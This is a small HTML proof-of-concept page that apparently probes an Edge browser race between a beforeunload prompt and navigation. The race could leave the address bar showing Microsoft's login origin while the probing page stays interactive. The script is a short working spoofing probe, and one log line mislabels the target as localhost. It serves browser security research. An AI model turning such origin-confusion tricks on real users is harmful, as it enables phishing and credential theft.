
<!doctype html>
<meta charset="utf-8">
<title>Edge beforeunload navigation race PoC</title>
<style>
  body { margin: 32px; font: 16px/1.45 system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif; }
  button { font: inherit; padding: 10px 16px; }
  pre { background: #111827; color: #d1fae5; padding: 14px; min-height: 90px; white-space: pre-wrap; }
</style>
<h1>Edge beforeunload / modal navigation race PoC</h1>
<p>
  This probes a recurring class where browser modal state, provisional navigation, and stale content
  used to create origin/address-bar confusion. Safe behavior: Edge should not show a trusted target
  origin while this page remains actionable.
</p>
<button id="arm">Arm beforeunload and navigate</button>
<pre id="log"></pre>
<script>
const log = s => document.getElementById("log").textContent += s + "\n";
document.getElementById("arm").addEventListener("click", () => {
  log("arming beforeunload");
  window.onbeforeunload = () => "research navigation-race prompt";
  setTimeout(() => {
    log("navigating to closed-port localhost target");
    location.href = "https://login.microsoftonline.com:81/common/oauth2/v2.0/authorize";
  }, 80);
});
</script>
